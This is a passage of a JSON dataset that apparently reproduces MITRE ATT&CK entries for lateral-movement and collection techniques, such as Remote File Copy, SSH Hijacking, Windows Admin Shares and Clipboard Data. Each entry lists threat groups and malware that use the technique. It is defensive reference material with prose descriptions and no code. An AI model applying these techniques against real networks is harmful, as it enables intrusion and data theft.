                {
                    "Name": "APT3",
                    "Description": "APT3 enables the Remote Desktop Protocol for persistence.[7]"
                },
                {
                    "Name": "Axiom",
                    "Description": "The Axiom group is known to have used RDP during operations.[8]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak enables concurrent Remote Desktop Protocol (RDP).[9]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has used Remote Desktop Protocol to conduct lateral movement.[10]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.[11]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 moved laterally via RDP.[12][13]"
                },
                {
                    "Name": "FIN10",
                    "Description": "FIN10 has used RDP to move laterally to systems in the victim environment.[14]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 used RDP to move laterally in victim networks.[15]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has used RDP for.[16]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can enable remote desktop on the victim's machine.[17]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware SierraCharlie uses RDP for propagation.[18][19]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used RDP connections to move across the victim network.[20]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.[21][22]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork attempted to use RDP to move laterally.[23]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.[24]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT has a module for performing remote desktop access.[25][26]"
                }
            ]
        },
        "Remote File Copy": {
            "Name": "Remote File Copy",
            "Description": "Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Files may be copied from an external adversary-controlled system through the Command and Control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with Windows Admin Shares or Remote Desktop Protocol.\n",
            "ID": "T1105",
            "Tactic": "Command And Control, Lateral Movement",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Packet capture, Process use of network, Netflow/Enclave netflow, Network protocol analysis, Process monitoring",
            "Requires Network: ": "Yes",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Agent.btz",
                    "Description": "Agent.btz attempts to download an encrypted binary from a specified domain.[1]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.[2][3]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that can copy files to remote machines.[4]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.[5]"
                },
                {
                    "Name": "APT37",
                    "Description": "APT37 has downloaded second stage malware from compromised websites.[6]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS is capable of downloading additional files through C2 channels, including a new version of itself.[7][8][9]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot uploads files and secondary payloads to the victim's machine.[10]"
                },
                {
                    "Name": "Bisonal",
                    "Description": "Bisonal has the capability to download files to execute on the victim’s machine.[11]"
                },
                {
                    "Name": "BITSAdmin",
                    "Description": "BITSAdmin can be used to create BITS Jobs to upload and/or download files.[12]"
                },
                {
                    "Name": "Briba",
                    "Description": "Briba downloads files onto infected hosts.[13]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used various tools to download files, including DGet (a similar tool to wget).[14]"
                },
                {
                    "Name": "Calisto",
                    "Description": "Calisto has the capability to upload and download files to the victim's machine.[15]"
                },
                {
                    "Name": "CallMe",
                    "Description": "CallMe has the capability to download a file to the victim from the C2 server.[16]"
                },
                {
                    "Name": "certutil",
                    "Description": "certutil can be used to download files from a given URL.[17][18]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes is capable of downloading files, including additional modules.[19][20][21]"
                },
                {
                    "Name": "China Chopper",
                    "Description": "China Chopper can upload and download files.[22]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "CHOPSTICK is capable of performing remote file transmission.[23]"
                },
                {
                    "Name": "CloudDuke",
                    "Description": "CloudDuke downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.[24]"
                },
                {
                    "Name": "cmd",
                    "Description": "cmd can be used to copy files to a remotely connected system.[25]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group uses public sites such as github.com and sendspace.com to upload files and then download them to victim computers.[26][27]"
                },
                {
                    "Name": "CORESHELL",
                    "Description": "CORESHELL downloads another dropper from its C2 server.[28]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson contains a command to retrieve files from its C2 server.[29]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Daserf can download remote files.[30][14]"
                },
                {
                    "Name": "DDKONG",
                    "Description": "DDKONG downloads and uploads files on the victim’s machine.[31]"
                },
                {
                    "Name": "Dipsind",
                    "Description": "Dipsind can download remote files.[32]"
                },
                {
                    "Name": "Downdelph",
                    "Description": "After downloading its main config file, Downdelph downloads multiple payloads from C2 servers.[33]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 copied and installed tools for operations once in the victim environment.[34][35]"
                },
                {
                    "Name": "DustySky",
                    "Description": "DustySky searches for network drives and removable media and duplicates itself onto them.[36]"
                },
                {
                    "Name": "Dyre",
                    "Description": "Dyre has a command to download and executes additional files.[37]"
                },
                {
                    "Name": "Elderwood",
                    "Description": "The Ritsol backdoor trojan used by Elderwood can download files onto a compromised host from a remote location.[38]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Emissary has the capability to download files from the C2 server.[39]"
                },
                {
                    "Name": "Felismus",
                    "Description": "Felismus can download files from remote servers.[40]"
                },
                {
                    "Name": "FELIXROOT",
                    "Description": "FELIXROOT downloads and uploads files to and from the victim’s machine.[41]"
                },
                {
                    "Name": "FIN10",
                    "Description": "FIN10 has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.[42]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.[43][44]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has used remote code execution to download subsequent payloads.[45]"
                },
                {
                    "Name": "Gamaredon Group",
                    "Description": "Tools used by Gamaredon Group are capable of downloading and executing additional payloads.[46]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer can execute a task to download a file.[47][48]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon can download additional components from the C2 server.[49]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can download additional files from C2 servers.[50]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.[51]"
                },
                {
                    "Name": "HAPPYWORK",
                    "Description": "can download and execute a second-stage payload.[6]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth can download additional files.[52]"
                },
                {
                    "Name": "Hi-Zor",
                    "Description": "Hi-Zor has the ability to upload and download files from its C2 server.[53]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser is capable of writing a file to the compromised system from the C2 server.[54]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can download files and additional malware components.[55][56]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can upload files to the victim's machine for operations.[57]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT can retrieve an additional payload from its C2 server.[58][59]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can download files and upgrade itself.[32]"
                },
                {
                    "Name": "jRAT",
                    "Description": "jRAT can download and execute files.[60]"
                },
                {
                    "Name": "KARAE",
                    "Description": "KARAE can upload and download files, including second-stage malware.[6]"
                },
                {
                    "Name": "Kasidet",
                    "Description": "Kasidet has the ability to download and execute additional files.[61]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.[62]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE can upload files to the victim’s machine and can download additional payloads.[63]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can download additional files.[64]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs downloads additional files from C2 servers.[65]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Several Lazarus Group malware families are capable of downloading and executing binaries from its C2 server.[66][67][68]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has downloaded additional scripts and files from adversary-controlled servers. Leviathan has also used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.[69][22]"
                },
                {
                    "Name": "Linfo",
                    "Description": "Linfo creates a backdoor through which remote attackers can download files onto compromised hosts.[70]"
                },
                {
                    "Name": "LOWBALL",
                    "Description": "LOWBALL uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware.[71]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound has downloaded additional code and files from servers onto victims.[72]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has installed updates and new malware on victims.[73]"
                },
                {
                    "Name": "MiniDuke",
                    "Description": "MiniDuke can download additional encrypted backdoors onto the victim via GIF files.[74]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Misdat is capable of downloading files from the C2.[75]"
                },
                {
                    "Name": "Mivast",
                    "Description": "Mivast has the capability to download and execute .exe files.[76]"
                },
                {
                    "Name": "MobileOrder",
                    "Description": "MobileOrder has a command to download a file from the C2 server to the victim mobile device's SD card.[16]"
                },
                {
                    "Name": "More_eggs",
                    "Description": "More_eggs can download and launch additional payloads.[77]"
                },
                {
                    "Name": "Mosquito",
                    "Description": "Mosquito can upload and download files to the victim.[78]"
                },
                {
                    "Name": "NanHaiShu",
                    "Description": "NanHaiShu can download additional files from URLs.[69]"
                },
                {
                    "Name": "NavRAT",
                    "Description": "NavRAT can download files remotely.[79]"
                },
                {
                    "Name": "NDiskMonitor",
                    "Description": "NDiskMonitor can download and execute a file from given URL.[9]"
                },
                {
                    "Name": "Nerex",
                    "Description": "Nerex creates a backdoor through which remote attackers can download files onto a compromised host.[38]"
                },
                {
                    "Name": "Nidiran",
                    "Description": "Nidiran can download and execute files.[80]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig can download remote files onto victims.[81]"
                },
                {
                    "Name": "OopsIE",
                    "Description": "OopsIE can download files from its C2 server to the victim's machine.[82][83]"
                },
                {
                    "Name": "Orz",
                    "Description": "Orz can download files onto the victim.[69]"
                },
                {
                    "Name": "Pasam",
                    "Description": "Pasam creates a backdoor through which remote attackers can upload files.[84]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork payloads download additional files from the C2 server.[85][9]"
                },
                {
                    "Name": "Pisloader",
                    "Description": "Pisloader has a command to upload a file to the victim machine.[86]"
                },
                {
                    "Name": "PLAINTEE",
                    "Description": "PLAINTEE has downloaded and executed additional plugins.[31]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.[87]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy creates a backdoor through which remote attackers can upload files.[88]"
                },
                {
                    "Name": "POSHSPY",
                    "Description": "POSHSPY downloads and executes additional PowerShell code and Windows binaries.[89]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke has a command to download a file.[90]"
                },
                {
                    "Name": "POWERSOURCE",
                    "Description": "POWERSOURCE has been observed being used to download TEXTMATE and the Cobalt Strike Beacon payload onto victims.[91]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can retrieve and execute additional PowerShell payloads from the C2 server.[92]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER can download or upload files from its C2 server.[81]"
                },
                {
                    "Name": "Psylo",
                    "Description": "Psylo has a command to download a file to the system from its C2 server.[16]"
                },
                {
                    "Name": "Pteranodon",
                    "Description": "Pteranodon can download and execute additional files.[46]"
                },
                {
                    "Name": "PUNCHBUGGY",
                    "Description": "PUNCHBUGGY can download additional files and payloads to compromised hosts.[93]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can upload and download to/from a victim machine.[94]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT can download files to the victim’s machine and execute them.[95][96]"
                },
                {
                    "Name": "Rancor",
                    "Description": "Rancor has downloaded additional malware, including by using certutil.[31]"
                },
                {
                    "Name": "RARSTONE",
                    "Description": "RARSTONE downloads its backdoor component from a C2 server and loads it directly into memory.[97]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA uploads and downloads information.[98][99]"
                },
                {
                    "Name": "RedLeaves",
                    "Description": "RedLeaves is capable of downloading a file from a specified URL.[100]"
                },
                {
                    "Name": "RemoteCMD",
                    "Description": "RemoteCMD copies a file over to the remote system before execution.[101]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.[102][103]"
                },
                {
                    "Name": "RGDoor",
                    "Description": "RGDoor uploads and downloads files to and from the victim’s machine.[104]"
                },
                {
                    "Name": "RogueRobin",
                    "Description": "RogueRobin can download files from the C2 server to the victim’s machine.[105]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT retrieves additional malicious payloads from the C2 server.[106]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can download additional files.[107]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Sakula has the capability to download files.[108]"
                },
                {
                    "Name": "SeaDuke",
                    "Description": "SeaDuke is capable of uploading and downloading files.[109]"
                },
                {
                    "Name": "SEASHARPEE",
                    "Description": "SEASHARPEE can download remote files onto victims.[110]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon can download an executable to run on the victim.[111]"
                },
                {
                    "Name": "SHUTTERSPEED",
                    "Description": "SHUTTERSPEED can download and execute an arbitary executable.[6]"
                },
                {
                    "Name": "SLOWDRIFT",
                    "Description": "SLOWDRIFT downloads additional payloads.[6]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader downloads a new version of itself once it has installed. It also downloads additional plugins.[112]"
                },
                {
                    "Name": "TDTESS",
                    "Description": "TDTESS has a command to download and execute an additional file.[113]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "After re-establishing access to a victim network, Threat Group-3390 actors download tools including gsecdump and WCE that are staged temporarily on websites that were previously compromised but never used.[54]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot downloads several additional files and saves them to the victim's machine.[114]"
                },
                {
                    "Name": "Trojan.Karagany",
                    "Description": "Trojan.Karagany can upload, download, and execute files on the victim.[115]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla has used shellcode to download Meterpreter after compromising a victim.[116]"
                },
                {
                    "Name": "TURNEDUP",
                    "Description": "TURNEDUP is capable of downloading additional files.[117]"
                },
                {
                    "Name": "TYPEFRAME",
                    "Description": "TYPEFRAME can upload and download files to the victim’s machine.[118]"
                },
                {
                    "Name": "Unknown Logger",
                    "Description": "Unknown Logger is capable of downloading remote files.[7]"
                },
                {
                    "Name": "UPPERCUT",
                    "Description": "UPPERCUT can download and upload files to and from the victim’s machine.[119]"
                },
                {
                    "Name": "Vasport",
                    "Description": "Vasport can download files.[120]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN can download and upload files to the victim's machine.[121]"
                },
                {
                    "Name": "Volgmer",
                    "Description": "Volgmer can download remote files and additional payloads to the victim's machine.[122][123][124]"
                },
                {
                    "Name": "Wiarp",
                    "Description": "Wiarp creates a backdoor through which remote attackers can download files.[125]"
                },
                {
                    "Name": "XTunnel",
                    "Description": "XTunnel is capable of downloading additional files.[126]"
                },
                {
                    "Name": "Zebrocy",
                    "Description": "Zebrocy obtains additional code to execute on the victim's machine.[127]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT can download additional payloads onto the victim.[128]"
                },
                {
                    "Name": "ZLib",
                    "Description": "ZLib has the ability to download files.[75]"
                }
            ]
        },
        "Remote Services": {
            "Name": "Remote Services",
            "Description": "An adversary may use Valid Accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\n",
            "ID": "T1021",
            "Tactic": "Lateral Movement",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Authentication logs",
            "CAPEC ID: ": "CAPEC-555",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can SSH to a remote service.[1]"
                },
                {
                    "Name": "GCMAN",
                    "Description": "GCMAN uses Putty and VNC for lateral movement.[2]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used Putty Secure Copy Client (PSCP) to transfer data.[3]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used Putty to access compromised systems.[4]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton uses VNC to connect into systems.[5]"
                }
            ]
        },
        "Shared Webroot": {
            "Name": "Shared Webroot",
            "Description": "Adversaries may add malicious content to an internally accessible website through an open network file share that contains the website's webroot or Web content directory [1] [2] and then browse to that content with a Web browser to cause the server to execute the malicious content. The malicious content will typically run under the context and permissions of the Web server process, often resulting in local system or administrative privileges, depending on how the Web server is configured.This mechanism of shared access and remote execution could be used for lateral movement to the system running the Web server. For example, a Web server running PHP with an open network share could allow an adversary to upload a remote access tool and PHP script to execute the RAT on the system running the Web server when a specific page is visited. [3]\n",
            "ID": "T1051",
            "Tactic": "Lateral Movement",
            "Platform: ": "Windows",
            "Data Sources: ": "File monitoring, Process monitoring",
            "CAPEC ID: ": "CAPEC-563",
            "Version": "1.0"
        },
        "SSH Hijacking": {
            "Name": "SSH Hijacking",
            "Description": "Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. [1] [2] [3] Compromising the SSH agent also provides access to intercept SSH credentials. [4]SSH Hijacking differs from use of Remote Services because it injects into an existing SSH session rather than creating a new session using Valid Accounts.\n",
            "ID": "T1184",
            "Tactic": "Lateral Movement",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User, root",
            "Data Sources: ": "Authentication logs",
            "Contributors: ": "Anastasios Pingios",
            "Version": "1.0"
        },
        "Taint Shared Content": {
            "Name": "Taint Shared Content",
            "Description": "Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses Shortcut Modification of directory .LNK files that use Masquerading to look like the real directories, which are hidden through Hidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. [1]\n",
            "ID": "T1080",
            "Tactic": "Lateral Movement",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Process monitoring",
            "CAPEC ID: ": "CAPEC-562",
            "Contributors: ": "David Routin",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Darkhotel",
                    "Description": "Darkhotel uses a virus that propagates by infecting executables stored on shared drives.[2]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 has functionality to copy itself to network shares.[3]"
                },
                {
                    "Name": "Miner-C",
                    "Description": "Miner-C copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file.[4]"
                }
            ]
        },
        "Windows Admin Shares": {
            "Name": "Windows Admin Shares",
            "Description": "Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over server message block (SMB) [1] to interact with systems using remote procedure calls (RPCs), [2] transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels. [3]The Net utility can be used to connect to Windows admin shares on remote systems using net use commands with valid credentials. [4]\n",
            "ID": "T1077",
            "Tactic": "Lateral Movement",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator",
            "Data Sources: ": "Process use of network, Authentication logs, Process monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-561",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT3",
                    "Description": "APT3 will copy files over to Windows Admin Shares (like ADMIN$) as part of lateral movement.[5]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy has run a plug-in on a victim to spread through the local network by using PsExec and accessing admin shares.[6]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can use Window admin shares (C$ and ADMIN$) for lateral movement.[7]"
                },
                {
                    "Name": "Deep Panda",
                    "Description": "Deep Panda uses net.exe to connect to network shares using net use commands with compromised credentials.[8]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Adversaries can instruct Duqu to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[9]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context.[10]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang actors have been known to copy files to the network shares of other computers to move laterally.[11][12]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs copies itself over network shares to move laterally on a victim network.[13]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware SierraAlfa accesses the ADMIN$ share via SMB to conduct lateral movement.[14][15]"
                },
                {
                    "Name": "Net",
                    "Description": "Lateral movement can be done with Net through net use commands to connect to the on remote systems.[16]"
                },
                {
                    "Name": "Net Crawler",
                    "Description": "Net Crawler uses Windows admin shares to establish authenticated sessions to remote systems over SMB as part of lateral movement.[17]"
                },
                {
                    "Name": "Orangeworm",
                    "Description": "Orangeworm has copied its backdoor across open network shares, including ADMIN$, C$WINDOWS, D$WINDOWS, and E$WINDOWS.[13]"
                },
                {
                    "Name": "PsExec",
                    "Description": "PsExec, a tool that has been used by adversaries, writes programs to the ADMIN$ network share to execute commands on remote systems.[18]"
                },
                {
                    "Name": "Regin",
                    "Description": "The Regin malware platform can use Windows admin shares to move laterally.[19]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon accesses network share(s), enables share access to the target device, and copies an executable payload to the target system, and uses a Scheduled Task to execute the malware.[20]"
                },
                {
                    "Name": "Threat Group-1314",
                    "Description": "Threat Group-1314 actors mapped network drives using net use.[21]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla used net use commands to connect to lateral systems within a network.[22]"
                }
            ]
        },
        "Audio Capture": {
            "Name": "Audio Capture",
            "Description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.\n",
            "ID": "T1123",
            "Tactic": "Collection",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "API monitoring, Process monitoring, File monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT37",
                    "Description": "APT37 has used an audio capturing utility known as SOUNDWAVE that captures microphone input.[1]"
                },
                {
                    "Name": "Bandook",
                    "Description": "Bandook has modules that are capable of capturing audio.[2]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi is capable of performing audio captures.[3]"
                },
                {
                    "Name": "EvilGrab",
                    "Description": "EvilGrab has the capability to capture audio from a victim machine.[4]"
                },
                {
                    "Name": "Flame",
                    "Description": "Flame can record audio using any existing hardware recording devices.[5][6]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can record sound using input audio devices.[7]"
                },
                {
                    "Name": "Janicab",
                    "Description": "Janicab captured audio and sent it out to a C2 server.[8][9]"
                },
                {
                    "Name": "MacSpy",
                    "Description": "MacSpy can record the sounds from microphones on a computer.[10]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's Get-MicrophoneAudio Exfiltration module can record system microphone audio.[11][12]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can record sound with the microphone.[13]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype.[14]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN can perform audio capture.[15]"
                }
            ]
        },
        "Automated Collection": {
            "Name": "Automated Collection",
            "Description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of Scripting to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. This technique may incorporate use of other techniques such as File and Directory Discovery and Remote File Copy to identify and move files.\n",
            "ID": "T1119",
            "Tactic": "Collection",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring, Data loss prevention, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[1]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS monitors USB devices and copies files with certain extensions toa predefined directory.[2]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot recursively generates a list of files within a directory and sends them back to the control server.[3]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie executes a batch script to store discovery information in %TEMP%\\info.dat and then uploads the temporarily file to the remote C2 server.[4]"
                },
                {
                    "Name": "FIN5",
                    "Description": "FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results.[5]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 has used a script to iterate through a list of compromised PoS systems, copy data to a log file, and remove the original data files.[6]"
                },
                {
                    "Name": "Helminth",
                    "Description": "A Helminth VBScript receives a batch script to execute a set of commands in a command prompt.[7]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "Each time a new drive is inserted, InvisiMole generates a list of all files on the drive and stores it in an encrypted file.[8]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has used automated collection.[9]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork developed a file stealer to search C:\\ and collect files with certain extensions. Patchwork also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.[2]"
                },
                {
                    "Name": "Proxysvc",
                    "Description": "Proxysvc automatically collects data about the victim and sends it to the control server.[10]"
                },
                {
                    "Name": "Rover",
                    "Description": "Rover automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.[11]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings.[12]"
                },
                {
                    "Name": "T9000",
                    "Description": "T9000 searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, .ppt, .xls, .docx, .pptx, *.xlsx). Any matching files are encrypted and written to a local user directory.[13]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories.[14]"
                },
                {
                    "Name": "USBStealer",
                    "Description": "For all non-removable drives on a victim, USBStealer executes automated collection of certain files for later exfiltration.[15]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt .[16]"
                }
            ]
        },
        "Clipboard Data": {
            "Name": "Clipboard Data",
            "Description": "Adversaries may collect data stored in the Windows clipboard from users copying information within or between applications. WindowsApplications can access clipboard data by using the Windows API. [1] MacOSX provides a native command, pbpaste, to grab clipboard contents  [2].\n",
            "ID": "T1115",
            "Tactic": "Collection",
            "Platform: ": "Linux, Windows, macOS",
            "Data Sources: ": "API monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Catchamas",
                    "Description": "Catchamas steals data stored in the clipboard.[3]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke copies and exfiltrates the clipboard contents every 30 seconds.[4]"
                },
                {
                    "Name": "Helminth",
                    "Description": "The executable version of Helminth has a module to log clipboard contents.[5]"
                },
                {
                    "Name": "JHUHUGIT",
